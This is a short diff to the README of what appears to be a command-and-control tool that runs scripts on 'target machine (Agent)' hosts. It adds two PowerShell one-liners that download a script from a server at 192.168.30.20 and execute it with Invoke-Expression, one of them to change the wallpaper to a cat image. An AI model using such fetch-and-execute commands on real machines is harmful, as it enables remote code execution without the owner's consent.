@@ -5,5 +5,10 @@ You should include 3 JSON files in /server directory: agents.json, commands_outp
 
 To run custom powershell scripts on target machine (Agent), you can execute this command:
 ```powershell
-Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://[IP]:5000/static/uploads/script.ps1").Content) )
+Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/uploads/script.ps1").Content) )
+```
+
+Change wallpaper to cat image:
+```powershell
+Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/uploads/wallpaper.ps1").Content) )
 ```
